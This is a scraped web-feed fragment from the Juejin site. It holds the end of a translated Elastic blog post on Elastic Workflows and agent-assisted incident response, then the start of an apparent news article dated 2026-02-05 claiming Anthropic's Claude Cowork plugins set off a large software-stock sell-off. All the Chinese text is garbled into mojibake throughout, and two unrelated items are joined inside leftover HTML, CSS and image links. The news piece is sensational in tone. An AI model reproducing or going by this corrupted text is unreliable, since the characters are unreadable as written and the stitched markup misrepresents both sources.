<p>ä½†å¹¶éæ¯ä¸ªäº‹ä»¶éƒ½æœ‰æ¨¡å¼ã€‚å¤æ‚çš„æ€§èƒ½ä¸‹é™ã€æ„å¤–å›å½’å’Œçº§è”æ•…éšœ â€”â€” è¿™äº›æƒ…å†µå¾ˆå°‘æœ‰æ˜ç¡®çš„æ“ä½œæ‰‹å†Œã€‚æ“ä½œäººå‘˜é€šå¸¸å¿…é¡»ä»é›¶å¼€å§‹è°ƒæŸ¥ï¼Œè·¨ä»ªè¡¨æ¿å’Œå·¥å…·å…³è”æ•°æ®ï¼Œä»¥å¼„æ¸…å®é™…å‘ç”Ÿäº†ä»€ä¹ˆã€‚</p>
<p>ä½¿ç”¨ workflows å’Œ agentsï¼Œè°ƒæŸ¥å¯ä»¥æ›´å¿«å¼€å§‹ã€‚ä¸€ä¸ªå¯ä»¥è®¿é—®ä½ çš„æ—¥å¿—ã€æŒ‡æ ‡å’Œ trace çš„ agent å¯ä»¥æ‰«ææœ€è¿‘éƒ¨ç½²ï¼Œè¯†åˆ«å…³è”å¼‚å¸¸ï¼Œå¹¶æå‡ºæœ€å¯èƒ½çš„è§£é‡Šã€‚æ“ä½œäººå‘˜ä¸å¿…æ‰‹åŠ¨ç»„è£…ä¸Šä¸‹æ–‡ï¼Œè€Œæ˜¯ä»ä¸€ä¸ªå‡è®¾å’Œæ”¯æŒè¯æ®å¼€å§‹ã€‚</p>
<p>å¦‚æœå‡è®¾æˆç«‹ï¼Œworkflow å¯ä»¥ç»§ç»­æ‰§è¡Œä¿®å¤æ“ä½œï¼Œå¦‚å›æ»šå˜æ›´ã€æ‰©å±•æœåŠ¡æˆ–è°ƒæ•´é…ç½®ã€‚agent æä¾›åˆ¤æ–­ï¼Œworkflow æä¾›æ‰§è¡Œã€‚æ“ä½œäººå‘˜ä¿æŒåœ¨ç¯ä¸­ï¼Œæ‰¹å‡†å…³é”®å†³ç­–å¹¶åœ¨éœ€è¦æ—¶å¹²é¢„ã€‚</p>
<p>ç»“æœæ˜¯åœ¨ä¸æ”¾å¼ƒç›‘ç£æˆ–æ§åˆ¶çš„æƒ…å†µä¸‹ï¼Œæ›´å¿«åœ°è§£å†³é—®é¢˜ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b230b1c9a88646e78685c34444516d54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=FBxxP4I7I2VtTEM6U4pxJuoA9HQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">å¼€å§‹ä½¿ç”¨ Elastic Workflows</h2>
<p>Elastic Workflows ç°å·²ä½œä¸ºæŠ€æœ¯é¢„è§ˆæä¾›ã€‚ä½ å¯ä»¥ä» <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.elastic.co%2Fregistration" title="https://cloud.elastic.co/registration" target="_blank" ref="nofollow noopener noreferrer">Elastic Cloud è¯•ç”¨</a>å¼€å§‹ï¼Œå¹¶æŸ¥çœ‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fexplore-analyze%2Fworkflows" title="https://www.elastic.co/docs/explore-analyze/workflows" target="_blank" ref="nofollow noopener noreferrer">æ–‡æ¡£</a>ã€‚</p>
<p>æˆ‘ä»¬æ­£åœ¨æŒç»­æ„å»ºé¢„åˆ¶ workflows å’Œ agent é›†æˆï¼Œä»¥å¸®åŠ©å›¢é˜Ÿè‡ªåŠ¨åŒ–æ›´å¤šå·¥ä½œã€‚å¦‚æœä½ ä¸€ç›´åœ¨å¯»æ‰¾ä¸€ç§æ–¹æ³•ï¼Œå°†è‡ªåŠ¨åŒ–æ›´è´´è¿‘ä½ çš„æ•°æ®ï¼ŒåŒæ—¶ä¸ç‰ºç‰²å¯é æ€§æˆ–çµæ´»æ€§ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„èµ·ç‚¹ã€‚</p>
<p>å¦‚éœ€æ›´æ·±å…¥çš„æŠ€æœ¯ç»†èŠ‚ï¼Œè¯·å‚é˜… Workflows<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F157726149" title="https://elasticstack.blog.csdn.net/article/details/157726149" target="_blank" ref="nofollow noopener noreferrer">æŠ€æœ¯åšå®¢</a>ã€‚</p>
<p><em>æœ¬æ–‡ä¸­æè¿°çš„ä»»ä½•åŠŸèƒ½æˆ–ç‰¹æ€§çš„å‘å¸ƒå’Œæ—¶é—´å®Œå…¨ç”± Elastic è‡ªè¡Œå†³å®šã€‚ä»»ä½•å½“å‰ä¸å¯ç”¨çš„åŠŸèƒ½å¯èƒ½æ— æ³•æŒ‰æ—¶æä¾›ï¼Œç”šè‡³å¯èƒ½æ°¸è¿œä¸ä¼šæä¾›ã€‚</em></p>
<p><em>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å¯èƒ½ä½¿ç”¨æˆ–æåŠäº†ç¬¬ä¸‰æ–¹ç”Ÿæˆå¼ AI å·¥å…·ï¼Œè¿™äº›å·¥å…·ç”±å„è‡ªæ‰€æœ‰è€…æ‹¥æœ‰å’Œè¿è¥ã€‚Elastic å¯¹è¿™äº›ç¬¬ä¸‰æ–¹å·¥å…·æ²¡æœ‰ä»»ä½•æ§åˆ¶ï¼Œä¹Ÿä¸å¯¹å…¶å†…å®¹ã€æ“ä½œæˆ–ä½¿ç”¨æ‰¿æ‹…è´£ä»»ï¼Œä¹Ÿä¸å¯¹ä½ ä½¿ç”¨è¿™äº›å·¥å…·å¯èƒ½äº§ç”Ÿçš„ä»»ä½•æŸå¤±æˆ–æŸå®³è´Ÿè´£ã€‚è¯·åœ¨ä½¿ç”¨åŒ…å«ä¸ªäººã€æ•æ„Ÿæˆ–æœºå¯†ä¿¡æ¯çš„ AI å·¥å…·æ—¶è°¨æ…æ“ä½œã€‚ä½ æäº¤çš„ä»»ä½•æ•°æ®å¯èƒ½ä¼šç”¨äº AI è®­ç»ƒæˆ–å…¶ä»–ç”¨é€”ã€‚æ— æ³•ä¿è¯ä½ æä¾›çš„ä¿¡æ¯ä¼šè¢«å®‰å…¨æˆ–ä¿å¯†åœ°ä¿å­˜ã€‚åœ¨ä½¿ç”¨ä»»ä½•ç”Ÿæˆå¼ AI å·¥å…·ä¹‹å‰ï¼Œä½ åº”äº†è§£å…¶éšç§æ”¿ç­–å’Œä½¿ç”¨æ¡æ¬¾ã€‚</em></p>
<p><em>Elasticã€Elasticsearch åŠç›¸å…³å•†æ ‡æ˜¯ Elasticsearch B.V. åœ¨ç¾å›½åŠå…¶ä»–å›½å®¶çš„å•†æ ‡ã€å¾½æ ‡æˆ–æ³¨å†Œå•†æ ‡ã€‚æ‰€æœ‰å…¶ä»–å…¬å¸å’Œäº§å“åç§°å‡ä¸ºå…¶å„è‡ªæ‰€æœ‰è€…çš„å•†æ ‡ã€å¾½æ ‡æˆ–æ³¨å†Œå•†æ ‡ã€‚</em></p>
<p>åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fblog%2Felastic-workflows-automation" title="https://www.elastic.co/search-labs/blog/elastic-workflows-automation" target="_blank" ref="nofollow noopener noreferrer">www.elastic.co/search-labsâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸‡äº¿å¸‚å€¼ä¸€å¤œè’¸å‘ï¼Claude Cowork è¡€æ´—å…¨çƒè½¯ä»¶ä¸šï¼Œè€é»„æ€¥äº†]]></title>    <link>https://juejin.cn/post/7603054272158957618</link>    <guid>https://juejin.cn/post/7603054272158957618</guid>    <pubDate>2026-02-05T10:15:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603054272158957618" data-draft-id="7602982045138812974" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸‡äº¿å¸‚å€¼ä¸€å¤œè’¸å‘ï¼Claude Cowork è¡€æ´—å…¨çƒè½¯ä»¶ä¸šï¼Œè€é»„æ€¥äº†"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-02-05T10:15:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ–°æ™ºå…ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸‡äº¿å¸‚å€¼ä¸€å¤œè’¸å‘ï¼Claude Cowork è¡€æ´—å…¨çƒè½¯ä»¶ä¸šï¼Œè€é»„æ€¥äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ–°æ™ºå…ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:15:32.000Z" title="Thu Feb 05 2026 10:15:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55060c6c2ef2420ba81bc9c124404dd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=f2UF9bxzy1BXPUsqNwk2KDfEAGQ%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>ã€Œã€æ–°æ™ºå…ƒå¯¼è¯»ã€‘åˆå´©äº†ï¼ç¡…è°·è½¯ä»¶å·¨å¤´çŸ­çŸ­ä¸€å¤œï¼Œè’¸å‘ 3000 äº¿ç¾é‡‘ï¼Œè¿‡å»ä¸€å‘¨å…¨çƒè¿‘ä¸‡äº¿ç¾é‡‘æ²¡äº†ã€‚ä»¤äººæƒ³ä¸åˆ°çš„æ˜¯ï¼Œç½ªé­ç¥¸é¦–ç«Ÿæ˜¯ Anthropic æ¨å‡ºçš„ä¸€æ¬¾æ’ä»¶ã€‚ã€</strong></h5>
<p>ç³å­”åœ°éœ‡ï¼ä¸€å¤œä¹‹é—´ï¼Œå…¨çƒè½¯ä»¶è‚¡é›†ä½“è·³æ°´ï¼Œè’¸å‘ 3000 äº¿ç¾é‡‘ã€‚</p>
<p>å¦‚ä»Šï¼Œæ•´ä¸ªç¡…è°·éƒ½åœ¨è¯´ï¼šè½¯ä»¶ï¼ˆSaaSï¼‰å·²æ­»ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3058e81f3d2c4df5987e81cc15e862fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=FglTggl19Ciq%2FjIJlwX68DCe4zg%3D" alt="" loading="lazy"/></p>
<p>èµ·å› ç«Ÿæ˜¯ï¼ŒAnthropic ä¸º Claude Cowork æ¤å…¥ã€Œæ’ä»¶ã€ï¼ˆpluginsï¼‰åŠŸèƒ½ã€‚ä»…å‡­ä¸€å·±ä¹‹åŠ›ï¼Œå‡Œè¿Ÿè€ç‰Œå·¨å¤´å…¬å¸ã€‚</p>
<p>æ³¨æ„ï¼è¿™è¿˜ä¸æ˜¯ã€Œæ–°æ¨¡å‹ã€ï¼Œä»…æ˜¯ 11 æ¬¾ã€Œæ–°æ’ä»¶ã€ã€‚</p>
<p>å®ƒä»¬ç›´æ¥ç»Ÿé¢†äº†è´¢åŠ¡ã€é”€å”®ã€æ³•å¾‹å„è¡Œå„ä¸šï¼Œä¸ç”¨åµŒå¥—åœ¨è½¯ä»¶ä¸­è¿è¡Œï¼ŒAI ç›´æ¥æŠŠè½¯ä»¶å–è€Œä»£ä¹‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8a9f850114e469c9182d9a08e152533~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=7EA0CRpuiIvvBtv5J8Vcsikhpf8%3D" alt="" loading="lazy"/></p>
<p>è¿™æ˜¯ç ´å¤©è’ç¬¬ä¸€æ¬¡ï¼Œä¸€å®¶åšåº•å±‚æ¨¡å‹çš„ AI å…¬å¸ï¼ŒæŠŠã€Œåº”ç”¨å±‚ã€ç›´æ¥ç«¯æ‰ï¼Œå¹¶æ¥ç®¡æ•´æ¡ä¸šåŠ¡å·¥ä½œæµã€‚</p>
<p>ç°å¦‚ä»Šï¼Œæ•´ä¸ªåå°”è¡—é™·å…¥ææ…Œï¼Œå®£ç§°ã€ŒSaaS æœ«æ—¥ã€ï¼ˆSaaSpocalypseï¼‰çœŸæ­£æ¥ä¸´ã€‚</p>
<p>æ‘©æ ¹å¤§é€šå‘æ–‡ç§°ï¼šAnthropic æ­£åœ¨åå™¬æ•´ä¸ªä¸–ç•Œï¼Œè®© Saas å•†ä¸šæ¨¡å¼å´©å¡Œï¼Œä¸”æ— å¤„å¯è—ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67dee5ed40514b169e83666f9207dfc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=i5YCrm9xAsYxoWNlw97Pf80jkI4%3D" alt="" loading="lazy"/></p>
<p>ç¾è‚¡æ–¹é¢ï¼Œå‘¨ä¸‰å¼€ç›˜ä¸ä¹…åï¼Œç”²éª¨æ–‡é‡æŒ« 4.2%ã€‚</p>
<p>éšä¹‹ï¼Œå…¶ä»–è½¯ä»¶å·¨å¤´ä¹Ÿçº·çº·èµ°ä½ï¼šAdobe ä¸‹è·Œ 2.6%ï¼ŒSalesforce è·Œ 3.3%ï¼ŒAtlassian è·Œ 3%......</p>
<p>ä»…åœ¨å½“åœ°æ—¶é—´å‘¨äºŒäº¤æ˜“ä¸­ï¼ŒçŸ­çŸ­ 24 å°æ—¶ï¼Œè½¯ä»¶ã€æ³•å¾‹ç§‘æŠ€ã€æ•°æ®æœåŠ¡å…¬å¸å¸‚å€¼è’¸å‘äº†çº¦ 2850-3000 äº¿ç¾å…ƒã€‚</p>
<p>è·¯é€ç§°ï¼Œè‡ª 1 æœˆ 28 ä»¥æ¥ï¼Œè½¯ä»¶å’ŒæœåŠ¡çš„è‚¡ä»·è’¸å‘è¿‘ 8300 äº¿ç¾å…ƒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff68a04892374caf85d6f25ca68607c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=xzdtVe6TdFzC3ycex5%2Fimx0sGas%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18767f1acfa84c24986c2277ae08a6b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=%2FYpXtOm1GRQfCP68r8q6MHodUl8%3D" alt="" loading="lazy"/></p>
<p>ä»¤äººç»†æ€ææçš„æ˜¯ï¼Œè¿™è¿˜ä»…æ˜¯ 11 æ¬¾æ’ä»¶ã€Œç ”ç©¶é¢„è§ˆç‰ˆã€è€Œå·²ï¼Œå°±æŠŠ AI è‡ªåŠ¨åŒ–æ ¹åŸºï¼Œæ‰åˆ°å„è¡Œå„ä¸šã€‚</p>
<p>ä¸å¾—ä¸è¯´ï¼Œæ´»åœ¨è¿™ä¸ªæ—¶ä»£çœŸæ˜¯ç–¯ç‹‚ï¼</p>
<p>ä¸€ä½å¤§ä½¬é”è¯„ï¼Œã€Œå¸‚åœºç»ˆäºä»å†°å†·æ•°å­¦é€»è¾‘ä¸­æƒŠé†’ï¼šå¦‚æœæ¨¡å‹èƒ½ç›´æ¥äº¤ä»˜æˆæœï¼Œä¼ ç»Ÿçš„è½¯ä»¶å¤–å£³å°†æ¯«æ— ä»·å€¼ã€ã€‚</p>
<p>æ¨¡å‹å³å‘˜å·¥ï¼Œè½¯ä»¶å³æ³¡æ²«ï¼ŒAnthropic çš„è½¬èº«å®£å‘Šäº†ä¸€ä¸ªæ—¶ä»£çš„ç»ˆç»“ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81b2cc63732f4b8fb24002c5867343e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=bPlRfZvKlvyCMH44jh9gpbdvOkQ%3D" alt="" loading="lazy"/></p>
<p>è¿˜æœ‰å¾ˆå¤šäººè¡¨ç¤ºï¼Œè¿™åªæ˜¯å†å²çš„æ’æ›²ï¼Œæœªæ¥ä¸å¯æƒ³è±¡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89c8c6c561cd49e58c66c2c26e8133e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=Pp4Y1nB9Kv%2F3VeD1%2FrsXKsAq1aY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f70bf60f7b254afcbec3e65bcbafde8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=ZYRTlDXH3iKprTYh8DfK%2F5%2FSRCc%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dcaec949ea374d07834e8e212a48e374~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=K57PyPQCScyoHCkAgu8kUcjxHkY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fdff999cd7794ad7a2dbf074f5901131~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=NK1OknuUK6Wepy79LGUXdNhD2rE%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3506d5e6f5214ef796d29e9cb027382f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=x3fr5g%2FaSVFvo9ul6VCt4eQSD7U%3D" alt="" loading="lazy"/></p>
<p>ä¸Šä¸‹æ»‘åŠ¨æŸ¥çœ‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/342a0018d7c6475e81d359e2679f451c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=gXw6Mwolc1j2l0dYygJhQWCk2W0%3D" alt="" loading="lazy"/></p>
<p><strong>ã€ŒClaude æ’ä»¶æ¥ç®¡ä¸€åˆ‡ã€</strong></p>
<p><strong>ã€Œè½¯ä»¶æ—¶ä»£å·²æ­»ã€</strong></p>
<p>è¯åˆè¯´å›æ¥ï¼ŒAnthropic å‘å¸ƒçš„ Coworkã€Œæ’ä»¶ã€æœ‰ä½•é­”åŠ›ï¼Œç«Ÿå¼•å‘å…¨çƒè½¯ä»¶è‚¡ç¥¨çš„ææ…Œï¼Ÿ</p>
<p>è¿™ä¸€åˆ‡ï¼Œè¿˜å¾—å›åˆ° 1 æœˆ 29 æ—¥ï¼Œä¸€åœºæ²¡æœ‰æ€èµ·ä»€ä¹ˆå¤§æµªçš„ã€Œå°æ›´æ–°ã€ã€‚</p>
<p>Claude Cowork è¿™æ¬¾ç”Ÿäº§åŠ›åŠå…¬ç¥å™¨ï¼Œè‡ªè¯ç”Ÿä¹‹åä¸€å¤œæˆä¸ºå½“çº¢ç‚¸å­é¸¡ï¼Œå„å®¶å…¬å¸éƒ½åœ¨çº·çº·æ•ˆä»¿ã€‚</p>
<p>ä¸Šå‘¨æœ«ï¼ŒCowork ç»ˆäºè¿æ¥äº†å²è¯—çº§æ›´æ–°ï¼šæ–°å¢ 11 æ¬¾æ’ä»¶ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d119230d381240e0b33e7872d6b5c90f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=HWUvHkiBrePAhE0taS%2FsAYYm%2BFc%3D" alt="" loading="lazy"/></p>
<p>å¯åˆ«å°çœ‹è¿™ä¸ªå°æ›´æ–°ï¼Œ11 æ¬¾æ’ä»¶ä¸€å£æ°”è¦†ç›–äº†é”€å”®ã€è´¢åŠ¡ã€æ³•å¾‹ã€æ•°æ®ã€å¸‚åœºè¥é”€ç­‰å¤šä¸ªé¢†åŸŸã€‚</p>
<p>åœ¨å®˜ç½‘ä»‹ç»ä¸­ï¼ŒAnthropic æ˜¯è¿™ä¹ˆæè¿°å…¶èƒ½åŠ›çš„ï¼š</p>
<p>ä½ å¯ä»¥å°†å„ç§æŠ€èƒ½ã€è¿æ¥å™¨ã€æ–œæ å‘½ä»¤å’Œå­æ™ºèƒ½ä½“ï¼ˆsub-agentsï¼‰æ•´åˆåœ¨ä¸€èµ·ï¼Œè®© Claude å˜èº«ä¸ºç²¾é€šå²—ä½ã€å›¢é˜Ÿå’Œå…¬å¸ä¸šåŠ¡çš„ã€Œç‰¹ç§å…µã€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c34a3b1e1d384650a9a88429add647b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=C2BP974Zo8hOwcUc2ex0mYQv2QE%3D" alt="" loading="lazy"/></p>
